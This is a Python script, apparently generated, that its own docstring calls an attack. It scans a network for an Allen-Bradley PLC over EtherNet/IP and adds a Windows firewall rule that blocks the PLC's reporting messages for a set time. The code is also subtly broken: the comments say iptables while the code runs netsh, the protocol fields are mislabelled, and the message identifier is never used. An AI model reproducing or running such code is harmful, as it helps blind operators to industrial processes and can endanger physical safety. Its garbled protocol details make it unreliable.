import socket
import struct
import time
import subprocess  # For running arp-scan or nmap
import re  # For parsing IP addresses

# Configuration
# You may need to adjust these based on your network setup
PLC_VENDOR_ID = 0x01  # Rockwell Automation/Allen-Bradley Vendor ID (common)
PLC_DEVICE_TYPE = 0x0C  # Programmable Logic Controller Device Type (common)
TARGET_PORT = 44818  # Common port for EtherNet/IP (Control and Information Protocol)
REPORTING_MESSAGE_IDENTIFIER = b'\x01\x00'  # Example, REPLACE WITH ACTUAL ID (See note 1)
BLOCKING_DURATION = 60  # seconds

def find_plc_ip():
    """
    Discovers the PLC's IP address by scanning the network and filtering
    based on the PLC's Vendor ID and Device Type in EtherNet/IP responses.

    This function uses arp-scan or nmap (if arp-scan is not found) to discover
    devices on the network. It then sends EtherNet/IP Get Attribute Single
    requests to each discovered IP to retrieve device information. The IP
    address of the PLC is returned if the Vendor ID and Device Type match
    the configured values.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    try:
        # Try using arp-scan (more efficient for local network scans)
        result = subprocess.run(['arp-scan', '-l', '-q', '--plain'], capture_output=True, text=True, check=True)
        output = result.stdout
        lines = output.strip().split('\n')
        ips = [line.split()[0] for line in lines if len(line.split()) > 1] #Extract IP addresses
    except FileNotFoundError:
        # arp-scan not found, try using nmap
        print("arp-scan not found. Falling back to nmap (this may take longer).")
        try:
            result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True, check=True) #change this to your ip
            output = result.stdout
            ips = re.findall(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        except FileNotFoundError:
            print("nmap also not found. Please install either arp-scan or nmap.")
            return None

    except subprocess.CalledProcessError as e:
        print(f"Error running network scan: {e}")
        return None

    if not ips:
        print("No devices found on the network.")
        return None

    print(f"Found potential devices: {ips}")

    for ip in ips:
        try:
            vendor_id, device_type = get_vendor_and_device_id(ip, TARGET_PORT)
            if vendor_id == PLC_VENDOR_ID and device_type == PLC_DEVICE_TYPE:
                print(f"Found PLC at IP: {ip}")
                return ip
        except Exception as e:
            print(f"Error querying device at {ip}: {e}")

    print("PLC not found based on Vendor ID and Device Type.")
    return None

def get_vendor_and_device_id(ip_address, port):
    """
    Sends an EtherNet/IP Get Attribute Single request to retrieve the Vendor ID
    and Device Type from a device.

    Args:
        ip_address (str): The IP address of the device to query.
        port (int): The port number to use for the connection.

    Returns:
        tuple: A tuple containing the Vendor ID and Device Type.

    Raises:
        Exception: If there is an error during the communication.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Set a timeout to prevent hanging
    try:
        sock.connect((ip_address, port))

        # Craft the EtherNet/IP Get Attribute Single request
        request = create_get_attribute_single_request()

        sock.sendall(request)

        response = sock.recv(1024)  # Adjust buffer size if needed
        # Parse the response (see detailed parsing below)
        vendor_id, device_type = parse_identity_response(response)
        return vendor_id, device_type

    except Exception as e:
        raise Exception(f"Error communicating with device: {e}")
    finally:
        sock.close()


def create_get_attribute_single_request():
    """
    Creates a CIP Get Attribute Single request to retrieve the Identity object
    (Object Class 0x01, Instance 0x01, Attribute 0x01).  This includes vendor ID and device type.
    """
    # Encapsulation Header (24 bytes)
    command = struct.pack('<H', 0x0063)  # List Services
    length = struct.pack('<H', 0x0A)      # Data Length (10 bytes for Identity Object)
    session_handle = struct.pack('<I', 0x00000000) # Session Handle (we don't have one yet)
    status = struct.pack('<I', 0x00000000)        # Status
    sender_context = b'\x00\x00\x00\x00\x00\x00\x00\x00' # Sender Context
    options = struct.pack('<I', 0x00000000)       # Options

    # CIP Request (10 bytes)
    service = struct.pack('<B', 0x0E)      # Get Attribute Single Service
    class_id = struct.pack('<B', 0x01)     # Identity Object Class
    instance_id = struct.pack('<B', 0x01)  # Instance 1
    attribute_id = struct.pack('<B', 0x01) # Attribute 1 (Vendor ID)
    padding = struct.pack('<H', 0x0000) #Padding

    # Assemble the request
    request = command + length + session_handle + status + sender_context + options + service + class_id + instance_id + attribute_id + padding
    return request

def parse_identity_response(response):
    """
    Parses the response from the Identity object and extracts the Vendor ID and
    Device Type.

    Args:
        response (bytes): The raw response data from the PLC.

    Returns:
        tuple: A tuple containing the Vendor ID and Device Type as integers.
    """
    #Minimal sanity check
    if len(response) < 40:  # Minimum expected response size
        raise ValueError("Response too short to be a valid Identity response.")

    # Extract Vendor ID and Device Type. Offset depend on the encapsulation header.
    # Adjust these offsets if necessary based on your PLC's response structure.
    try:
      vendor_id = struct.unpack('<H', response[30:32])[0]
      device_type = struct.unpack('<B', response[32:33])[0]
      return vendor_id, device_type
    except struct.error as e:
        raise ValueError(f"Error unpacking response data: {e}")


def block_reporting_message(plc_ip, target_port, message_identifier):
    """
    Blocks reporting messages by dropping packets containing the specified identifier.
    This is achieved using iptables rules on the Windows machine.

    Args:
        plc_ip (str): The IP address of the PLC.
        target_port (int): The port used for communication with the PLC.
        message_identifier (bytes): The identifier of the reporting message to block.
    """

    try:
        # Construct the iptables rule.  Requires Administrator privileges.
        # This rule assumes a simple setup.  Adjust based on your network.
        rule = f'netsh advfirewall firewall add rule name="Block Reporting Message" dir=in interface=any action=block remoteip={plc_ip} remoteport={target_port} protocol=tcp  program="any"'

        # Execute the iptables command
        subprocess.run(rule, shell=True, check=True, capture_output=True, text=True) #Run the rule

        print(f"Successfully blocked reporting messages from {plc_ip}:{target_port} containing identifier {message_identifier.hex()}.")

    except subprocess.CalledProcessError as e:
        print(f"Error blocking reporting messages: {e.stderr}")
        raise # re-raise to stop execution

def restore_firewall_rules(plc_ip, target_port):
    """
    Restores the firewall rules by deleting the rule that blocks reporting messages.

    Args:
        plc_ip (str): The IP address of the PLC.
        target_port (int): The port used for communication with the PLC.
    """
    try:
        # Construct the iptables command to delete the rule.  Requires Administrator privileges.
        rule = f'netsh advfirewall firewall delete rule name="Block Reporting Message" remoteip={plc_ip} remoteport={target_port} protocol=tcp'

        # Execute the iptables command
        subprocess.run(rule, shell=True, check=True, capture_output=True, text=True)

        print(f"Successfully restored firewall rules for {plc_ip}:{target_port}.")

    except subprocess.CalledProcessError as e:
        print(f"Error restoring firewall rules: {e.stderr}")

def main():
    """
    Main function to orchestrate the attack.
    """
    plc_ip = find_plc_ip()

    if not plc_ip:
        print("Could not automatically find PLC IP. Exiting.")
        return

    try:
        # Block reporting messages
        block_reporting_message(plc_ip, TARGET_PORT, REPORTING_MESSAGE_IDENTIFIER)

        # Wait for the specified duration
        print(f"Blocking reporting messages for {BLOCKING_DURATION} seconds...")
        time.sleep(BLOCKING_DURATION)

    finally:
        # Restore firewall rules, even if an error occurred
        restore_firewall_rules(plc_ip, TARGET_PORT)
        print("Script completed.")

if __name__ == "__main__":
    main()